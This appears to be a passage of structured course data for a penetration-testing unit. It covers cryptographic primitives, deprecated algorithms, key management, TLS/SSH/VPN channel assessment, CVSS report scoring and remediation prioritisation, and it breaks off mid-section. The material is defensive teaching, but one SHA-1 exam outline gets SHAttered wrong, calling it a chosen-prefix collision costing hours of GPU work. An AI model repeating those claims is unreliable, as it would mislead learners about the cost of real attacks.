          "Cryptography splits symmetric (fast, distribution problem) from asymmetric (slow, distribution solved) - hybrid protocols compose both; the kill table (DES 1998, MD5 2004, RC4 2015, SHA-1 2017, 3DES 2023) is the finding generator. Keys fail in management, not mathematics: nonce reuse, ECB, fleet-shared secrets. Secure channels layer TLS/SSH/IPsec with forward secrecy. Reporting converts shells into decisions: the CVSS 10.0-vs-7.2 pair, the sprint list from 230 findings, class remediation, and the 31 to 19 to 11 maturity trend.",
        sections: [
          {
            number: "4.1",
            title: "Basics of cryptography",
            body: [
              "Cryptography provides the four services every secure system composes: confidentiality (only key-holders read the data), integrity (tampering is detectable), authentication (identities or origins are provable) and non-repudiation (signatures bind an act to a key). The foundational split is symmetric versus asymmetric: symmetric cryptography uses one shared secret key for both encryption and decryption - fast (gigabytes per second in AES-NI hardware), ideal for bulk data, but it needs a way to share the key securely; asymmetric cryptography uses a key pair (public to encrypt or verify, private to decrypt or sign) - solves key distribution and signatures, but is 100-1000x slower. Every real protocol, TLS included, is therefore a hybrid: asymmetric to agree on a session key, symmetric for the payload. The exam's canonical sentence: 'asymmetric solves the key-distribution problem; symmetric solves the performance problem'.",
              "The supporting cast and their roles are examinable: hash functions (SHA-256) produce fixed-length digests for integrity - one-way, collision-resistant, never called 'encryption'; HMAC adds a key to a hash for authenticated integrity; digital signatures (RSA-PSS, ECDSA) sign a hash with the private key for non-repudiation; and key-derivation functions (PBKDF2, Argon2) turn passwords into keys by paying a configurable compute cost - 600,000 iterations in the modern OWASP recommendation for password storage. The worked numbers show why primitives differ: AES-128-GCM on a modern CPU encrypts ~3-5 GB/s; RSA-2048 signs ~1,000 times per second and verifies ~30,000; a PBKDF2 password hash is deliberately slowed to ~50 hashes per second per core so that a GPU rig's offline guesses are throttled.",
              "The tester's view of cryptography is a maturity ladder examiners reward: level 0 - no crypto (plaintext protocols, HTTP logins); level 1 - homemade crypto (custom 'XOR encryption', hand-rolled ciphers - always a critical finding, quote Schneier's line that anyone can invent a cipher only they can break); level 2 - correct primitives, wrong use (ECB mode leaking patterns, hard-coded keys in source, MD5 for passwords); level 3 - right primitives, right modes, wrong management (keys never rotated, unencrypted backups). Most pentest findings sit at levels 1-2, and the report language matches: 'insecure by design' for level 1, 'misapplied cryptography' for level 2.",
              "Exam framing: 'Explain the basic concepts of cryptography - symmetric, asymmetric, hashing, signatures' is a 7-14 mark staple. Define the four services, contrast the two families with the speed numbers, assign each supporting primitive its role, and close with the tester's maturity ladder - the framing that converts a definition question into a security-analysis answer.",
            ],
            keyTerms: [
              { term: "Symmetric cryptography", definition: "One shared key for encryption and decryption - AES class, fast, needs secure key sharing." },
              { term: "Asymmetric cryptography", definition: "Public/private key pair - solves distribution and signatures, 100-1000x slower." },
              { term: "KDF", definition: "Key-derivation function (PBKDF2, Argon2) that turns a password into a key at deliberate computational cost." },
              { term: "Non-repudiation", definition: "A signature provably binding an action to a private key, so the signer cannot deny it." },
            ],
            diagram: {
              kind: "compare",
              title: "Symmetric vs asymmetric - the hybrid split",
              caption: "TLS is the synthesis: asymmetric once to agree, symmetric forever to protect.",
              left: {
                heading: "Symmetric (AES-GCM)",
                items: [
                  "One shared secret key",
                  "3-5 GB/s with AES-NI - bulk data",
                  "Key distribution is the problem",
                  "Role: session encryption",
                ],
              },
              right: {
                heading: "Asymmetric (RSA/ECC)",
                items: [
                  "Public encrypts / private decrypts",
                  "~1,000-30,000 ops/s - expensive",
                  "Distribution solved by publishing",
                  "Role: key exchange + signatures",
                ],
              },
            },
            bullets: [
              "Four services: confidentiality, integrity, authentication, non-repudiation.",
              "Symmetric: AES-GCM ~3-5 GB/s; asymmetric: RSA-2048 ~1k sign / ~30k verify per second.",
              "Hashes (SHA-256) are one-way digests - integrity only, never 'encryption'.",
              "HMAC = keyed integrity; signatures (RSA-PSS, ECDSA) = non-repudiation over a hash.",
              "KDFs: PBKDF2 600k iterations (OWASP) or Argon2 for password storage - deliberate slowness.",
              "Tester's ladder: no crypto -> homemade -> misapplied (ECB, hardcoded keys) -> management gaps.",
            ],
            callout: {
              type: "exam",
              title: "Never call a hash 'encryption'",
              body: "The fastest lost mark in this unit is writing 'SHA-256 encrypts the password'. Hashing is one-way digesting; encryption is reversible under a key. The corrected sentence - 'SHA-256 stores a one-way digest so the plaintext is never recoverable' - is worth the definition mark alone.",
            },
            table: {
              caption: "Primitive-to-role mapping.",
              headers: ["Primitive", "Service provided", "Worked performance", "Classic misuse finding"],
              rows: [
                ["AES-128-GCM", "Confidentiality + integrity (AEAD)", "3-5 GB/s", "ECB mode; hardcoded keys"],
                ["RSA-2048", "Key exchange, signatures", "~1k sign/s, ~30k verify/s", "1024-bit keys; e=1"],
                ["ECDSA P-256", "Signatures (small keys)", "~10-20k sign/s", "Reused k nonce -> key leak"],
                ["SHA-256", "Integrity digest", "~1-2 GB/s", "Password storage without KDF"],
                ["PBKDF2/Argon2", "Password -> key", "~50/s per core (deliberate)", "1 iteration; unsalted MD5"],
              ],
            },
            examQuestions: [
              {
                q: "Explain the fundamental concepts of cryptography: the four services, symmetric versus asymmetric cryptography with performance numbers, and the role of hashes, HMAC, signatures and KDFs. Close with the tester's maturity ladder for cryptographic findings.",
                marks: 14,
                outline: [
                  "Services: confidentiality, integrity, authentication, non-repudiation",
                  "Symmetric: one key, AES-GCM 3-5 GB/s, distribution problem",
                  "Asymmetric: key pair, RSA-2048 ~1k sign / ~30k verify/s, distribution solved",
                  "Hybrid protocols: asymmetric session-key agreement + symmetric bulk encryption",
                  "Hashes one-way for integrity; HMAC keyed; signatures non-repudiation; KDFs slow passwords",
                  "PBKDF2 600k iterations / Argon2; GPU throttling to ~50/s per core",
                  "Ladder: no crypto -> homemade -> misapplied (ECB, hardcoded) -> management gaps; most findings at levels 1-2",
                ],
              },
              {
                q: "Why do real protocols combine asymmetric and symmetric cryptography rather than using either alone?",
                marks: 7,
                outline: [
                  "Asymmetric alone too slow for bulk data (100-1000x)",
                  "Symmetric alone cannot distribute keys without a prior secret",
                  "Hybrid: asymmetric agreement of a session key, then AES for payload",
                  "TLS/TLS 1.3 exemplify: ECDHE key exchange + AEAD record layer",
                  "Session keys are ephemeral -> forward secrecy",
                ],
              },
            ],
          },
          {
            number: "4.2",
            title: "Cryptographic algorithms and protocols",
            body: [
              "The algorithm inventory the exam wants, grouped by family. Block ciphers (AES-128/256 with GCM or CBC modes, 3DES legacy) transform fixed 128-bit blocks under a key; stream ciphers (ChaCha20-Poly1305 in TLS 1.3, RC4 deceased) XOR keystream with plaintext at byte granularity; asymmetric algorithms (RSA-2048/4096, ECDH/ECDSA over P-256 and Curve25519, Diffie-Hellman groups) provide key agreement and signatures; and hash families (SHA-2 256/384, SHA-3, the SHA-1 and MD5 retirees) provide digests. Protocol layer: TLS 1.2/1.3 protect transport, SSH protects shells and tunnels, IPsec protects network layers, PGP/GPG protects files and mail, and Kerberos protects domain authentication - each protocol is a composition of the primitives above plus its own handshake logic.",
              "Deprecation history is where the marks hide: MD5 (broken collisions 2004), SHA-1 (practical collision SHAttered 2017), RC4 (biases, removed from TLS 2015), 3DES (64-bit blocks, Sweet32 birthday attacks, deprecated 2023), RSA-1024 (factoring margin, forbidden), DES (56-bit key, brute-forced 1998 for USD 250k of hardware). A tester's protocol scan reads this history as findings: SSLv3/TLS 1.0/1.1 enabled (POODLE/BEAST class), TLS 1.2 with RC4 or CBC cipher suites (Lucky13), certificates with SHA-1 signatures, and Diffie-Hellman under 2048 bits (Logjam). The standard assessment tool is testssl.sh or sslscan: testssl.sh --quiet --severity HIGH target:443 emits a graded table of protocol and cipher findings in minutes.",
              "The worked walkthrough of a modern handshake ties the families together - TLS 1.3: ClientHello with supported groups and key shares; the server picks ECDHE over x25519, both sides compute the shared secret, derive keys via HKDF, and all further traffic is AES-256-GCM or ChaCha20-Poly1305 AEAD; the certificate chain is signed with ECDSA P-256 or RSA-4096 and validated against root stores; 1-RTT (vs TLS 1.2's 2-RTT), forward secrecy by default, and the old cipher zoo pruned to three AEAD suites. Reading a TLS 1.3 handshake aloud in an exam answer - naming which primitive plays which role at which step - demonstrates exactly the composition competence this section tests.",
              "Exam framing: 'Explain cryptographic algorithms and protocols used in secure communication' is a 14-mark standard. Group the families (block, stream, asymmetric, hash), tabulate the deprecation history with the kill year and cause, walk the TLS 1.3 handshake naming primitives per step, and add the testssl.sh finding list as the tester's application.",
            ],
            keyTerms: [
              { term: "AEAD", definition: "Authenticated Encryption with Associated Data - one primitive delivering confidentiality plus integrity (GCM, ChaCha20-Poly1305)." },
              { term: "ECDHE", definition: "Elliptic-Curve Diffie-Hellman Ephemeral - the forward-secret key agreement of modern TLS." },
              { term: "Sweet32", definition: "Birthday-bound attack against 64-bit block ciphers like 3DES in long sessions." },
              { term: "testssl.sh", definition: "The standard CLI assessment of TLS protocol, cipher and certificate health." },
            ],
            diagram: {
              kind: "pipeline",
              title: "A TLS 1.3 handshake - who plays which role",
              caption: "Name the primitive at every step; that composition is the exam's competency test.",
              stages: [
                { label: "ClientHello", note: "supported groups + x25519 key share" },
                { label: "ServerHello", note: "pick ECDHE group, own key share" },
                { label: "Key derivation", note: "HKDF -> application keys" },
                { label: "Certificate", note: "ECDSA P-256 chain vs root store" },
                { label: "Encrypted traffic", note: "AES-256-GCM / ChaCha20-Poly1305 AEAD" },
              ],
            },
            bullets: [
              "Families: block (AES-GCM/CBC), stream (ChaCha20-Poly1305; RC4 dead), asymmetric (RSA, ECDH/ECDSA), hashes (SHA-2/3).",
              "Protocols: TLS 1.2/1.3, SSH, IPsec, PGP, Kerberos - compositions of the primitives.",
              "Deprecations: MD5 2004, SHA-1 2017 (SHAttered), RC4 2015, 3DES/Sweet32 2023, DES brute-forced 1998.",
              "Findings class: SSLv3/1.0/1.1 enabled, RC4/CBC suites, SHA-1 certs, DH < 2048 (Logjam).",
              "Assessment tooling: testssl.sh / sslscan graded protocol and cipher output in minutes.",
              "TLS 1.3: 1-RTT, forward secrecy default, three AEAD suites, HKDF key schedule.",
            ],
            callout: {
              type: "tip",
              title: "Deprecation history = finding generator",
              body: "Memorize the kill table (MD5 2004, SHA-1 2017, RC4 2015, 3DES 2023, DES 1998). In any protocol-assessment answer, each row converts into a live finding class the tester reports - examiners reward candidates who connect history to present-day scan output.",
            },
            table: {
              caption: "The deprecation kill table.",
              headers: ["Algorithm", "Killed by", "Year", "Modern replacement"],
              rows: [
                ["DES (56-bit)", "Brute force (USD 250k machine)", "1998", "AES-128/256"],
                ["MD5", "Collision attacks", "2004", "SHA-256"],
                ["RC4", "Statistical biases", "2015 (TLS removal)", "ChaCha20-Poly1305"],
                ["SHA-1", "SHAttered practical collision", "2017", "SHA-256"],
                ["3DES", "Sweet32 birthday bound", "2023 (NIST)", "AES-GCM"],
                ["RSA-1024", "Factoring margin", "forbidden", "RSA-2048+/ECC P-256"],
              ],
            },
            examQuestions: [
              {
                q: "Explain the families of cryptographic algorithms and the protocols that compose them. Tabulate the deprecation history with causes, walk the TLS 1.3 handshake naming each primitive's role, and describe how a tester assesses protocol health with tooling.",
                marks: 14,
                outline: [
                  "Families: block (AES), stream (ChaCha20), asymmetric (RSA/ECDH/ECDSA), hashes (SHA-2/3)",
                  "Protocols: TLS, SSH, IPsec, PGP, Kerberos as compositions",
                  "Kill table: DES 1998, MD5 2004, RC4 2015, SHA-1 2017, 3DES 2023",
                  "TLS 1.3 walkthrough: ClientHello key share -> ECDHE x25519 -> HKDF -> cert ECDSA -> AEAD traffic",
                  "1-RTT and forward secrecy as the design wins over TLS 1.2",
                  "Findings: SSLv3/1.0/1.1, RC4/CBC suites, SHA-1 certs, Logjam DH",
                  "Tooling: testssl.sh/sslscan graded output as the assessment artifact",
                ],
              },
              {
                q: "Why was SHA-1 deprecated in 2017 and what findings does a live SHA-1 certificate generate?",
                marks: 7,
                outline: [
                  "SHAttered demonstrated a practical chosen-prefix collision",
                  "Collision breaks signature bindings, enabling forgery of signed content",
                  "Cost dropped to a few hours of GPU work",
                  "Live SHA-1 cert = critical finding: certificate forgery path",
                  "Remediation: re-issue with SHA-256; browsers already reject SHA-1",
                ],
              },
            ],
          },
          {
            number: "4.3",
            title: "Encryption, decryption and key management",
            body: [
              "Encryption and decryption are the reversible halves of confidentiality: encryption maps plaintext + key -> ciphertext, decryption inverts it with the same (symmetric) or paired (asymmetric) key. The mechanics the exam wants: a block cipher in GCM mode takes a key, a unique nonce/IV per message, plaintext and optional associated data, and returns ciphertext plus an authentication tag - wrong tag means the ciphertext was tampered and must be discarded. The two catastrophic usage errors are nonce reuse in GCM/CTR (keystream reuse XORs two messages' plaintexts together) and ECB mode (identical blocks encrypt identically - the penguin-image demonstration where ECB-encrypted bitmap still shows the penguin). Decryption-side discipline: constant-time comparison of tags (never ==), no padding-oracle leaks (the CBC padding oracle class of 2002-2019), and authenticated decryption before any use of the plaintext.",
              "Key management is where cryptography actually fails, and the exam knows it: generation (keys from CSPRNGs - the Debian OpenSSL 2008 RNG bug produced 32,768 possible keys), distribution (out-of-band exchange, KMS services), storage (HSMs and TPMs at the secure end; plaintext keys in source code, config files and unencrypted backups at the tester's finding end), rotation (periodic rekeying; TLS certificates every 90 days with Let's Encrypt automation), revocation (CRL/OCSP for certificates), and destruction (wipe or zeroize, with the key-escrow policy question). The canonical finding list: hardcoded API keys and database passwords in a git repository (git log history keeps them forever), symmetric keys shared across environments (the staging key that opens production), keys never rotated despite staff departures, and backups encrypted with the same key as the live system.",
              "The worked example ties usage and management together: a backup system encrypts with AES-256-GCM (good primitive), but the key is generated from the hostname via MD5 (bad generation), stored in /etc/backup.conf world-readable (bad storage), identical across all 40 servers (bad distribution - one host compromise decrypts the fleet), and never rotated since 2019 (bad lifecycle). Fixing only the cipher changes nothing; the finding is the key-management failure, and the remediation plan is a KMS (HashiCorp Vault or cloud KMS), per-host keys from a proper RNG, quarterly rotation, and file permissions enforced by config management. The exam sentence: 'cryptography fails in practice through key management, not through mathematics'.",
              "Exam framing: 'Explain encryption/decryption and discuss key management challenges' is a 14-mark standard. Define the encrypt/decrypt pair with the GCM mechanics, name the two catastrophic usage errors (nonce reuse, ECB), walk the key lifecycle stage by stage with the worked backup-system failure, and close with the management-over-mathematics sentence.",
            ],
            keyTerms: [
              { term: "Nonce/IV", definition: "The per-message unique value that keeps GCM/CTR keystreams distinct - reuse is catastrophic." },
              { term: "ECB mode", definition: "The block mode encrypting identical blocks identically - leaks structure, the textbook misuse." },
              { term: "HSM", definition: "Hardware Security Module - tamper-resistant key storage and signing hardware." },
              { term: "Key rotation", definition: "Periodic rekeying limiting the blast radius of any single key compromise." },
            ],
            diagram: {
              kind: "cycle",
              title: "The key lifecycle - where management fails",
              caption: "Five stages; the tester's findings cluster in storage and rotation, not generation.",
              steps: [
                { label: "Generate", note: "CSPRNG only; Debian 2008 = 32,768 keys" },
                { label: "Distribute", note: "KMS / out-of-band; one key for 40 hosts = fail" },
                { label: "Store", note: "HSM/TPM vs plaintext config files" },
                { label: "Rotate", note: "quarterly; TLS certs 90 days automated" },
                { label: "Revoke / destroy", note: "CRL/OCSP; zeroize with escrow policy" },
              ],
            },
            bullets: [
              "GCM mechanics: key + unique nonce + plaintext + AAD -> ciphertext + tag; verify tag before use.",
              "Two catastrophic errors: nonce reuse (keystream XOR leak) and ECB (structure leak - the penguin).",
              "Decryption discipline: constant-time tag compare, no padding oracles, authenticate first.",
              "Key lifecycle: generate (CSPRNG), distribute (KMS), store (HSM/TPM), rotate (quarterly/90-day), revoke/destroy.",
              "Finding class: hardcoded keys in git, one key across 40 hosts, no rotation since 2019, keys in backups.",
              "Worked case: AES-256-GCM with hostname-MD5 key, world-readable config, fleet-shared - fix is KMS + per-host keys.",
            ],
            callout: {
              type: "warning",
              title: "The key is the finding, not the cipher",
              body: "When you find strong AES wrapping weak key management, report the management. Clients 'fix' cryptography by upgrading the cipher and keep the fleet-shared, never-rotated key - the actual breach path. Name the lifecycle stage of each failure in the report.",
            },
            codeExample: {
              language: "python",
              caption: "kms_demo.py - GCM used correctly",
              code: `import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

key = AESGCM.generate_key(bit_length=256)   # CSPRNG-backed
aes = AESGCM(key)

nonce = os.urandom(12)                        # UNIQUE per message
ct = aes.encrypt(nonce, b"payroll batch 7", b"hdr:v1")

# decrypt: authenticate before using plaintext
pt = aes.decrypt(nonce, ct, b"hdr:v1")        # raises if tag fails

# WRONG: nonce = os.urandom(12) reused for msg2 -> keystream reuse`,
            },
            examQuestions: [
              {
                q: "Explain encryption and decryption mechanics, the two catastrophic usage errors, and the full key-management lifecycle. Work through a real-world failure case that combines correct cipher use with failed key management, and state the remediation.",
                marks: 14,
                outline: [
                  "Encrypt: plaintext + key + nonce -> ciphertext + tag (GCM); decrypt authenticates first",
                  "Error 1: nonce reuse in GCM/CTR - keystream XOR leak",
                  "Error 2: ECB mode - identical blocks, penguin demonstration",
                  "Lifecycle: generation (CSPRNG, Debian 2008), distribution (KMS), storage (HSM/TPM), rotation, revocation/destruction",
                  "Worked case: AES-256-GCM but hostname-MD5 key, world-readable config, 40-host shared key, no rotation",
                  "Why the cipher upgrade fixes nothing: management is the breach path",
                  "Remediation: Vault/KMS, per-host keys, quarterly rotation, permissions via config management",
                ],
              },
              {
                q: "Why is nonce reuse in AES-GCM catastrophic? Explain what leaks.",
                marks: 7,
                outline: [
                  "GCM is CTR mode: keystream = AES(nonce || counter) XOR plaintext",
                  "Same nonce -> same keystream for both messages",
                  "Ciphertext1 XOR ciphertext2 = plaintext1 XOR plaintext2 - known plaintext reveals the other",
                  "Also enables forbidden-attack forgeries on the authentication tag",
                  "Rule: fresh unique nonce per message, generated safely",
                ],
              },
            ],
          },
          {
            number: "4.4",
            title: "Secure communication channels",
            body: [
              "Secure channels wrap cryptography into protocols the tester verifies daily, and the syllabus's set is: TLS (transport: web, mail, APIs), SSH (interactive shells, tunnels, file transfer), IPsec (site-to-site VPNs at the network layer), VPN protocols (WireGuard, OpenVPN for remote users), and application-channel protocols (Signal-style end-to-end messaging, PGP/GPG for mail). Each is evaluated on the same axes: what layer it protects, its authentication model (certificates, pre-shared keys, host keys), its forward secrecy, and its known weaknesses. The tester's questions per channel: is the channel actually encrypted end-to-end or only at hops; is the endpoint authenticated (certificate validation failures are the classic evil-twin enabler); and is the configuration modern (protocol versions, cipher suites, key sizes).",
              "TLS deep-dive numbers, examinable: certificate chain validation - hostname match, chain to a trusted root, validity window, revocation status, and signature strength; a testssl.sh assessment against a misconfigured server returns 'SSLv3 enabled', 'TLS 1.0/1.1 enabled', 'CBC suites offered', 'HSTS missing', 'cert chain incomplete' - five findings from one command. HSTS (Strict-Transport-Security) and certificate transparency matter for the downgrade and mis-issuance classes; OCSP stapling for revocation latency; and TLS 1.3's 1-RTT handshake plus 0-RTT caveat (early data is replayable - a real finding class for state-changing requests). SSH discipline: host-key pinning (the TOFU model's risk), modern key exchanges (curve25519-sha256), Ed25519 keys, and disabling password auth for keys - the tester's findings list is 'password auth enabled', 'root login permitted', 'old KEX algorithms still offered'.",
              "The worked architecture example composes the channels as a defence reviewer would: a remote worker reaches the corporate app via WireGuard VPN (layer 3, ChaCha20-Poly1305, 1-RTT handshakes, pre-shared endpoint keys), the VPN gateway terminates into a segmented network, and the app itself serves TLS 1.3 with HSTS - so the traffic is encrypted in two nested channels with different authentication models. The findings that break the picture: the VPN accepts TLS 1.0 fallback on a legacy portal (one command proves it), the app's internal service-to-service traffic is plaintext HTTP ('internal network is trusted' - the flat-network assumption the pivot sections of Unit 2 already falsified), and one API endpoint validates certificates but not hostnames (MitM-vulnerable). Each finding quotes the channel, the weakness class and the fix.",
              "Exam framing: 'Explain secure communication channels and their evaluation' is a 14-mark standard. Survey the channel set by layer and authentication model, work the TLS assessment findings from testssl.sh output, give the SSH checklist, and close with the composed-architecture example including the plaintext-internal finding.",
            ],
            keyTerms: [
              { term: "HSTS", definition: "Strict-Transport-Security header forcing browsers to HTTPS and killing downgrade clicks." },
              { term: "Forward secrecy", definition: "Ephemeral key exchange so past sessions stay confidential even if the long-term key leaks." },
              { term: "TOFU", definition: "Trust On First Use - SSH's host-key model; vulnerable to first-connection MitM." },
              { term: "0-RTT", definition: "TLS 1.3 early data - faster but replayable; dangerous for state-changing requests." },
            ],
            diagram: {
              kind: "layers",
              title: "Nested secure channels in one architecture",
              caption: "VPN inside TLS or TLS inside VPN - name the layer and the authentication model of each.",
              layers: [
                { label: "Application: TLS 1.3 + HSTS", note: "cert-authenticated, AEAD, 1-RTT" },
                { label: "Session/API: mTLS optional", note: "both sides present certificates" },
                { label: "Transport: WireGuard VPN", note: "ChaCha20-Poly1305, PSK endpoint auth" },
                { label: "Network: IPsec site-to-site", note: "ESP tunnel mode, IKEv2" },
                { label: "Link/physical", note: "out of crypto scope - physical controls" },
              ],
            },
            bullets: [
              "Channel set: TLS (transport), SSH (shell/tunnel), IPsec/WireGuard (network/VPN), PGP/Signal (application).",
              "TLS validation: hostname, chain, validity, revocation, signature strength - testssl.sh grades all in one run.",
              "Worked findings: SSLv3/1.0/1.1 enabled, CBC suites, HSTS missing, incomplete chain, 0-RTT on state-changing paths.",
              "SSH checklist: curve25519-sha256 KEX, Ed25519 host keys, password auth off, root login off.",
              "Composed example: WireGuard VPN -> segmented network -> TLS 1.3 app; plaintext internal HTTP is the finding.",
              "0-RTT caveat: replayable early data - state-changing requests must reject it.",
            ],
            callout: {
              type: "exam",
              title: "Name the layer of every channel",
              body: "The comparison mark comes from layer discipline: TLS protects transport sessions, IPsec protects network-layer packets, PGP protects the message object itself. Draw the nested-layers sketch and place each protocol on its layer - most lost marks in this question are layer confusions, not cipher errors.",
            },
            table: {
              caption: "Channel evaluation checklist - axes and findings.",
              headers: ["Channel", "Layer", "Authentication model", "Tester's findings class"],
              rows: [
                ["TLS 1.2/1.3", "Transport", "X.509 certificate chains", "Old versions, CBC suites, missing HSTS"],
                ["SSH", "Session/transport", "Host keys (TOFU) + user keys", "Password auth, legacy KEX, root login"],
                ["IPsec/IKEv2", "Network", "PSK or certs per gateway", "Weak DH groups, aggressive mode"],
                ["WireGuard", "Network (UDP)", "Endpoint public keys + PSK", "Key hygiene; allowed-IPs overreach"],
                ["PGP/Signal", "Application object", "Long-term identity keys", "Key trust-web failures, no verification"],
              ],
            },
            examQuestions: [
              {
                q: "Explain the main secure communication channels, the layer each protects and its authentication model. Work through a TLS assessment producing five findings, give the SSH hardening checklist, and analyse a composed VPN+TLS architecture including the plaintext-internal weakness.",
                marks: 14,
                outline: [
                  "Channels by layer: TLS transport, SSH session, IPsec/WireGuard network, PGP application object",
                  "Authentication models: certificate chains, TOFU host keys, endpoint public keys",
                  "TLS assessment: SSLv3/1.0/1.1 enabled, CBC suites, HSTS missing, incomplete chain, hostname-gap on one endpoint",
                  "TLS 1.3 specifics: 1-RTT, forward secrecy, 0-RTT replay caveat",
                  "SSH checklist: curve25519 KEX, Ed25519 keys, password auth disabled, root login disabled",
                  "Composed architecture: WireGuard -> segmentation -> TLS 1.3 app - two nested channels",
                  "Flat-network finding: internal HTTP 'trusted' - falsified by Unit 2 pivoting",
                ],
              },
              {
                q: "What is forward secrecy and why do modern protocols make it default?",
                marks: 7,
                outline: [
                  "Session keys derived from ephemeral ECDHE secrets",
                  "Long-term key compromise later does not decrypt past captures",
                  "Without FS (static RSA key exchange), recorded traffic decrypts after key leak",
                  "TLS 1.3 removed static RSA entirely - FS by default",
                  "Tester's check: cipher suite list must show (EC)DHE",
                ],
              },
            ],
          },
          {
            number: "4.5",
            title: "Documentation and reporting of findings",
            body: [
              "The report is the deliverable the client pays for, and its structure is standard enough to be examinable: executive summary (one page, business language, risk trend, the impact sentences from Unit 2.3), scope and methodology (what was tested, when, with which standards - PTES/NIST/OWASP), findings (each with title, affected asset, severity, description, reproduction evidence, business impact, remediation), appendix (tool outputs, full asset inventory, raw evidence). Findings ordering is by severity with the exploit-chain narrative first: 'chain 1 - internet to internal network in 40 minutes' outranks any single CVE because it is the story the board acts on.",
              "Severity scoring uses CVSS v3.1 as the base vocabulary: eight metrics - Attack Vector (Network/Adjacent/Local/Physical), Attack Complexity, Privileges Required, User Interaction, Scope, and the C/I/A impacts - combine into a 0-10 score with bands Low 0.1-3.9, Medium 4.0-6.9, High 7.0-8.9, Critical 9.0-10. The worked example earns the marks: SQL injection, network-reachable, no privileges, no interaction, scope-changed, all impacts high - AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H = 10.0 Critical; the same injection requiring an authenticated admin session - AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H = 7.2 High; the difference is two metrics, and the exam wants you to know which. Severity in the report = CVSS base + environmental context (is the asset internet-facing? is the data regulated?), never CVSS alone.",
              "Evidence discipline makes the report defensible: every finding carries reproduction steps a third party can execute, timestamped screenshots with the tester's identity visible, tool output excerpts (not full dumps), and redaction of customer data and credentials (hash lists appear as counts, screenshots blur rows). The report also documents limitations honestly: what was not tested (DoS, out-of-scope subsidiaries), access constraints, and the possibility that undetected vulnerabilities remain - the sentence clients' legal teams require. Retest language sets expectations: a fixed finding is re-verified on request, and the retest note appears in the finding's status field, not as a new report.",
              "Exam framing: 'Explain how penetration test findings are documented and reported' is a 7-14 mark standard. Write the report structure in order, define CVSS with the worked 10.0 vs 7.2 pair, give the evidence and redaction rules, and close with the impact-chain-first ordering argument.",
            ],
            keyTerms: [
              { term: "CVSS v3.1", definition: "The 0-10 severity scoring system from eight base metrics; bands Low/Medium/High/Critical." },
              { term: "Executive summary", definition: "The one-page business-language section a board reads; impact chains, not CVEs." },
              { term: "Reproduction steps", definition: "The exact commands/requests a third party runs to re-verify a finding." },
              { term: "Scope statement", definition: "The tested/not-tested boundary the legal team requires the report to state." },
            ],
            diagram: {
              kind: "pipeline",
              title: "From finding to report entry",
              caption: "Five stages between the shell and the client's ticket queue.",
              stages: [
                { label: "Verify", note: "manual confirmation, kill false positives" },
                { label: "Score", note: "CVSS base + environmental context" },
                { label: "Evidence", note: "repro steps, timestamps, redaction" },
                { label: "Write", note: "description, impact, remediation" },
                { label: "Order", note: "chains first, then severity-sorted singles" },
              ],
            },
            bullets: [
              "Report structure: executive summary -> scope/methodology -> findings -> appendix; chains narrated before singles.",
              "CVSS v3.1: AV, AC, PR, UI, S, C, I, A -> 0-10; bands 0.1-3.9 / 4.0-6.9 / 7.0-8.9 / 9.0-10.",
              "Worked pair: unauthenticated SQLi S:C all-high = 10.0 Critical; admin-only same flaw = 7.2 High.",
              "Severity = CVSS + business context (internet-facing, regulated data) - never CVSS alone.",
              "Evidence rules: reproducible steps, timestamped screenshots, excerpts not dumps, customer data redacted.",
              "Honesty section: untested areas, constraints, residual risk sentence; retests recorded in status field.",
            ],
            callout: {
              type: "exam",
              title: "Practise one CVSS vector to fluency",
              body: "The 10.0 vector AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H and its authenticated 7.2 twin (PR:H, S:U) are the exam's favourite numerical. Write both vectors from memory and explain which two metric changes moved the score - that one pair demonstrates you understand the system, not just the bands.",
            },
            table: {
              caption: "CVSS worked pair - the exam's favourite numerical.",
              headers: ["Metric", "Unauthenticated SQLi", "Admin-only SQLi"],
              rows: [
                ["Attack Vector (AV)", "N (network)", "N (network)"],
                ["Attack Complexity (AC)", "L", "L"],
                ["Privileges Required (PR)", "N", "H"],
                ["User Interaction (UI)", "N", "N"],
                ["Scope (S)", "C (changed)", "U (unchanged)"],
                ["C / I / A", "H / H / H", "H / H / H"],
                ["Score", "10.0 Critical", "7.2 High"],
              ],
            },
            examQuestions: [
              {
                q: "Explain how penetration test results are documented and reported. Give the report structure, define CVSS v3.1 with a worked scoring pair, state the evidence and redaction rules, and justify ordering findings by exploit chain.",
                marks: 14,
                outline: [
                  "Structure: executive summary, scope/methodology, findings, appendix",
                  "Executive summary carries impact chains in business language",
                  "CVSS v3.1: eight metrics, four bands; worked 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/all-H) vs 7.2 (PR:H, S:U)",
                  "Severity = CVSS + environmental context, never CVSS alone",
                  "Evidence: repro steps, timestamped screenshots, tool excerpts, redaction of data/creds",
                  "Honest limitations section; retest recorded in status field",
                  "Chain-first ordering: internet-to-internal in 40 min outranks single CVEs",
                ],
              },
              {
                q: "Why should report severity never be raw CVSS alone? Give one worked adjustment.",
                marks: 7,
                outline: [
                  "CVSS base scores are context-free technical severity",
                  "Business context changes real risk: internet-facing vs lab asset",
                  "Regulated data (PII/PHI) raises impact beyond base metrics",
                  "Worked: base 7.2 admin-only SQLi on the public admin panel -> raised to 8.6+ environmental",
                  "Report shows both: base vector + contextual rationale",
                ],
              },
            ],
          },
          {
            number: "4.6",
            title: "Prioritizing and mitigating vulnerabilities",
            body: [
              "Prioritization is the bridge between the findings list and the client's finite engineering capacity: 230 findings cannot be fixed at once, so the report proposes an order. The standard model ranks by risk = severity x exposure x exploitability: CVSS severity from section 4.5, exposure (internet-facing outranks internal), exploitability (a public exploit and a Metasploit module means attackers need an afternoon; a theoretical class means research effort), and compensating controls (a WAF in front of the injection changes the urgency, not the finding). Practical output: a 30-day sprint list (the 8-12 highest-risk fixes), a 90-day list (hardening class), and a backlog (informational and low findings with scheduled review).",
              "The worked matrix applies the model: 230 findings triage to 9 Critical (4 internet-facing with public exploits - the sprint), 31 High (12 internet-facing - sprint or 30 days), 74 Medium (90 days), 116 Low/informational (backlog). The mitigations column pairs each sprint item with its fix class: injection -> parameterized queries (days of work), missing patches -> patch cycle (hours per host, sequenced by exposure), access control -> authorization middleware (weeks, design change), default credentials -> rotation programme (hours). The exam's analysis mark lives in the sequencing argument: fix the 4 internet-facing criticals first not because they score highest but because they are reachable by every scanner-wielding attacker on the internet today.",
